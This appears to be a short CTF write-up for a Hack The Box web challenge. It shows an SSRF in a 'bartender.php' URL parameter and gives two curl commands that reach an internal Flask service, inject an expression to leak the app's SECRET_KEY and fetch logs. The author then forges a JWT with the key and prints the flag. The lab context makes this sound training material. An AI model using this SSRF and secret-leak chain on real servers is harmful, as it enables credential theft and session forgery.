
![](https://cdn-images-1.medium.com/max/1000/1*deH2y4E_5g0F8PqyV8jNHw.png)

#### Challenge Scenario

---

In a world without internet, information has a new price. One secret. One look. What are you willing to trade?

check the website

![](https://cdn-images-1.medium.com/max/1000/1*HjGGYNc2QHK9xuE5uKYBBg.png)

![](https://cdn-images-1.medium.com/max/1000/1*Q23Mg5n75PEYymC1Hiw7LQ.png)

we try submit [http://baidu.com](http://baidu.com)

and we got 

![](https://cdn-images-1.medium.com/max/1000/1*sZssWgJdmjGqVSnnBWiZ6Q.png)

url，it seems like ssrf

check the zip file

app.py and init .py

![](https://cdn-images-1.medium.com/max/1000/1*G6Cnc0okZOC76ocj4AKZNw.png)

check we confirm the ssrf is avaliable

so,use

curl -L -o /dev/null “[http://154.57.164.79:32010/bartender.php?url=http://127.0.0.1:5000/?x=%7Blogify.__globals__%5Bapp%5D.config%5BSECRET_KEY%5D%7D&url=https://example.com](http://154.57.164.79:32010/bartender.php?url=http://127.0.0.1:5000/?x=%7Blogify.__globals__%5Bapp%5D.config%5BSECRET_KEY%5D%7D&url=https://example.com)"

and 

curl -L -o leak_final.pdf “[http://154.57.164.79:32010/bartender.php?url=http://127.0.0.1:5000/logs&url=https://example.com](http://154.57.164.79:32010/bartender.php?url=http://127.0.0.1:5000/logs&url=https://example.com)"

to inject toget secretkey

![](https://cdn-images-1.medium.com/max/1000/1*Q3NxhpaYdifnewgaHi5EOQ.png)

![](https://cdn-images-1.medium.com/max/1000/1*def3Ikr7pDnrJkvhILmmKA.png)

than use this key to make a jwt

![](https://cdn-images-1.medium.com/max/1000/1*aarddYnEFwx_xRYr_M-vYQ.png)

use this jwt

![](https://cdn-images-1.medium.com/max/1000/1*NhEr74JcFiGf3PbCCFX5qw.png)

![](https://cdn-images-1.medium.com/max/1000/1*4R-JCJWiHvigQ5w9kzrj_g.png)

we got it 

**_HTB{84c5031b166c697cf206b8b1b8487436}_**